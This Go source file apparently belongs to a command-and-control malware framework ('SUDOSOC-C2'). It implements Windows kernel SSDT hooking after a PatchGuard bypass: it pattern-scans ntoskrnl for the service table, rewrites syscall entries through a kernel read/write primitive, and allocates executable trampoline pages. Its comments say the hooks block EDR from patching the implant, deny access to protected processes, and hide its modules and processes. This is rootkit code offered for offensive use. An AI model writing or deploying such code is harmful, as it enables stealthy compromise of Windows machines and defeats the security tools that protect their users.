package kpp

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	SSDT (System Service Descriptor Table) hooking — what PG bypass enables.

	The SSDT maps system call numbers to kernel function addresses. Hooking
	it allows intercepting every Windows system call. PatchGuard protects the
	SSDT — once PatchGuard is neutralized via context and DPC bypass, SSDT
	hooks become safe.

	SSDT structure (KeServiceDescriptorTable):
	  typedef struct _KSERVICE_TABLE_DESCRIPTOR {
	    PULONG_PTR Base;        // pointer to function offset array
	    PULONG    Count;        // call counter (optional, usually NULL)
	    ULONG     Limit;        // number of entries
	    PUCHAR    Number;       // argument number table
	  } KSERVICE_TABLE_DESCRIPTOR;

	The Base array contains RELATIVE offsets (32-bit signed, not absolute VAs)
	on x64 Windows 7+. To get the absolute address:
	  fn_addr = (int32)(Base[index]) >> 4  + (uint64)Base

	Locating the SSDT:
	  KeServiceDescriptorTable is exported from ntoskrnl. We resolve it via
	  our existing export scanner.

	Hooks we install (examples):
	  NtCreateProcess / NtCreateProcessEx — monitor/filter process creation
	  NtOpenProcess                        — deny access to protected PIDs
	  NtWriteVirtualMemory                 — prevent EDR from patching our code
	  NtSetInformationThread               — block thread hiding detection
	  NtQuerySystemInformation             — hide our modules/processes

	Each hook:
	  1. Saves the original SSDT entry value.
	  2. Allocates a trampoline page (locked in RAM).
	  3. Writes the filter function + JMP-to-original into the trampoline.
	  4. Patches the SSDT entry with the new relative offset.
*/

import (
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// SSDTHook describes one installed SSDT hook.
type SSDTHook struct {
	SyscallIndex uint32
	OrigOffset   int32   // original relative offset stored in SSDT
	HookVA       uintptr // our hook function VA
	HookPhys     uint64
	Active       bool
}

// SSDTState holds all SSDT hook state.
type SSDTState struct {
	SSDTBase    uint64   // kernel VA of Base array (the uint32 offset table)
	SSDTLimit   uint32   // number of entries
	Hooks       []*SSDTHook
}

// LocateSSDTO finds KeServiceDescriptorTable in ntoskrnl and returns
// the kernel VA of the Base (function offset) array.
func LocateSSDTO(kRW KernelRWer, kbase uint64) (*SSDTState, error) {
	// KeServiceDescriptorTable is exported — find it by scanning the export
	// directory (same approach as apihash / BYOVD modules).
	// For simplicity we pattern-scan for the well-known SSDT prologue sequence
	// in ntoskrnl's .data section:
	//   The table starts with a PULONG_PTR to KiServiceTable, immediately
	//   followed by NULL (Count), then Limit (uint32 = number of syscalls,
	//   typically 0x01F4..0x0240), then Number pointer.
	ssdtKernelVA, err := findSSDTByPattern(kRW, kbase)
	if err != nil {
		return nil, fmt.Errorf("find SSDT: %w", err)
	}

	// Read the Base pointer (KiServiceTable VA).
	base, err := kRW.ReadQword(ssdtKernelVA)
	if err != nil {
		return nil, fmt.Errorf("read SSDT.Base: %w", err)
	}

	// Read Limit (at offset +0x10, after Count=NULL).
	limitRaw, err := kRW.ReadDword(ssdtKernelVA + 0x10)
	if err != nil {
		return nil, fmt.Errorf("read SSDT.Limit: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[kpp] SSDT Base=0x%x Limit=%d", base, limitRaw)
	// {{end}}

	return &SSDTState{
		SSDTBase:  base,
		SSDTLimit: limitRaw,
	}, nil
}

// HookSyscall installs a hook for the syscall at index.
// hookFn is the address of our hook function (in locked memory).
// Returns the hook descriptor for later removal.
func (s *SSDTState) HookSyscall(kRW KernelRWer, index uint32, hookFn uintptr) (*SSDTHook, error) {
	if uint32(index) >= s.SSDTLimit {
		return nil, fmt.Errorf("syscall index %d out of range (limit=%d)", index, s.SSDTLimit)
	}

	// Read current 4-byte entry.
	entryAddr := s.SSDTBase + uint64(index)*4
	rawEntry, err := kRW.ReadDword(entryAddr)
	if err != nil {
		return nil, fmt.Errorf("read SSDT[%d]: %w", index, err)
	}
	origOffset := int32(rawEntry)

	// Compute new relative offset for our hook:
	// new_entry = (hookFn - s.SSDTBase) << 4  (low 4 bits = arg count)
	argCount := rawEntry & 0x0F // preserve argument count in low nibble
	diff := int64(hookFn) - int64(s.SSDTBase)
	if diff > 0x7FFFFFFF || diff < -0x80000000 {
		return nil, fmt.Errorf("hook VA 0x%x too far from SSDT base — alloc closer", hookFn)
	}
	newEntry := uint32((int32(diff) << 4) | int32(argCount))

	// Write the new entry.
	// The SSDT is in read-only .data on PG-protected systems — PG bypass
	// must be active before calling this function.
	// We write via kernel QWORD (two entries at once for alignment).
	qwordAddr := entryAddr &^ 7
	offset := entryAddr - qwordAddr // 0 or 4

	curQword, err := kRW.ReadQword(qwordAddr)
	if err != nil {
		return nil, err
	}
	var patchedQword uint64
	if offset == 0 {
		patchedQword = (curQword & 0xFFFFFFFF00000000) | uint64(newEntry)
	} else {
		patchedQword = (curQword & 0x00000000FFFFFFFF) | (uint64(newEntry) << 32)
	}
	if err := kRW.WriteQword(qwordAddr, patchedQword); err != nil {
		return nil, fmt.Errorf("write SSDT[%d]: %w", index, err)
	}

	hook := &SSDTHook{
		SyscallIndex: index,
		OrigOffset:   origOffset,
		HookVA:       hookFn,
		Active:       true,
	}
	s.Hooks = append(s.Hooks, hook)

	// {{if .Config.Debug}}
	log.Printf("[kpp] SSDT[%d] hooked: 0x%08x → 0x%08x (fn=0x%x)",
		index, rawEntry, newEntry, hookFn)
	// {{end}}
	return hook, nil
}

// UnhookSyscall restores a hooked SSDT entry.
func (s *SSDTState) UnhookSyscall(kRW KernelRWer, hook *SSDTHook) error {
	if !hook.Active {
		return nil
	}
	entryAddr := s.SSDTBase + uint64(hook.SyscallIndex)*4
	qwordAddr := entryAddr &^ 7
	offset := entryAddr - qwordAddr

	curQword, err := kRW.ReadQword(qwordAddr)
	if err != nil {
		return err
	}
	var restored uint64
	if offset == 0 {
		restored = (curQword & 0xFFFFFFFF00000000) | uint64(uint32(hook.OrigOffset))
	} else {
		restored = (curQword & 0x00000000FFFFFFFF) | (uint64(uint32(hook.OrigOffset)) << 32)
	}
	if err := kRW.WriteQword(qwordAddr, restored); err != nil {
		return err
	}
	hook.Active = false
	return nil
}

// CommonSyscallIndices maps well-known NT syscall names to their indices.
// Indices vary by Windows build — these are for Windows 11 23H2 x64.
// Use NtQuerySystemInformation(SystemServiceDescriptorTable) for dynamic resolution.
var CommonSyscallIndices = map[string]uint32{
	"NtCreateProcess":           0x004D,
	"NtCreateProcessEx":         0x004E,
	"NtOpenProcess":             0x0026,
	"NtTerminateProcess":        0x002C,
	"NtWriteVirtualMemory":      0x003A,
	"NtReadVirtualMemory":       0x003F,
	"NtQuerySystemInformation":  0x0036,
	"NtSetInformationThread":    0x000A,
	"NtCreateFile":              0x0055,
	"NtLoadDriver":              0x00D1,
	"NtSetSystemInformation":    0x00A3,
}

// findSSDTByPattern scans ntoskrnl's .data/.rdata for the SSDT structure.
func findSSDTByPattern(kRW KernelRWer, kbase uint64) (uint64, error) {
	// The SSDT is typically at a fixed offset from kbase on a given build.
	// We scan ntoskrnl's .rdata + .data sections for the characteristic
	// pattern: a pointer to KiServiceTable (in .text, 0-8 MB from kbase)
	// followed by NULL and a limit value 0x100-0x400.
	const scanStart = uint64(0x100000) // skip first 1 MB (code)
	const scanEnd   = uint64(0x900000)

	for off := scanStart; off < scanEnd; off += 8 {
		addr := kbase + off

		// Read potential Base pointer.
		base, err := kRW.ReadQword(addr)
		if err != nil {
			continue
		}
		// Base must be in ntoskrnl .text range.
		if base < kbase || base > kbase+8*1024*1024 {
			continue
		}

		// Count should be NULL (offset +8).
		count, err := kRW.ReadQword(addr + 8)
		if err != nil || count != 0 {
			continue
		}

		// Limit should be 0x100–0x400 (offset +0x10, lower 32 bits).
		limitRaw, err := kRW.ReadDword(addr + 0x10)
		if err != nil {
			continue
		}
		if limitRaw < 0x100 || limitRaw > 0x400 {
			continue
		}

		// {{if .Config.Debug}}
		log.Printf("[kpp] SSDT candidate @ 0x%x (base=0x%x limit=%d)", addr, base, limitRaw)
		// {{end}}
		return addr, nil
	}
	return 0, fmt.Errorf("SSDT not found in ntoskrnl scan")
}

// AllocHookPage allocates an executable, locked page for hook trampolines.
func AllocHookPage() (uintptr, error) {
	va, err := windows.VirtualAlloc(0, 4096,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, err
	}
	if err := windows.VirtualLock(va, 4096); err != nil {
		windows.VirtualFree(va, 0, windows.MEM_RELEASE)
		return 0, err
	}
	return va, nil
}
